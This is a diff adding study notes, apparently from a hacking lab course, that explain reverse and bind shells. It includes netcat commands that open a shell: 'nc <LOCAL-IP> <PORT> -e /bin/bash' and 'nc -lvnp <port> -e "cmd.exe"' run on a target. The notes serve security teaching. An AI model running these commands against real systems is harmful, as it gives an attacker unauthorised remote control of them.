@@ -78,3 +78,20 @@ _nc <LOCAL-IP> <PORT> -e /bin/bash_
 
 Notice that after running the command on the right, the listener receives a connection. When the whoami command is run, we see that we are executing commands as the target user. The important thing here is that we are listening on our own attacking machine, and sending a connection from the target.
 
+*Bind shell example:*
+
+Bind shells are less common, but still very useful.  
+
+Once again, take a look at the following image. Again, on the left we have the attacker's computer, on the right we have a simulated target. Just to shake things up a little, we'll use a Windows target this time. First, we start a listener on the target -- this time we're also telling it to execute cmd.exe. Then, with the listener up and running, we connect from our own machine to the newly opened port.
+
+On the target:  
+
+_nc -lvnp <port> -e "cmd.exe"_
+
+On the attacking machine:  
+
+_nc MACHINE_IP <port>_
+
+<img width="1327" height="207" alt="image" src="https://github.com/user-attachments/assets/0dc150a7-69fc-4a60-88e5-97a35210457c" />
+
+
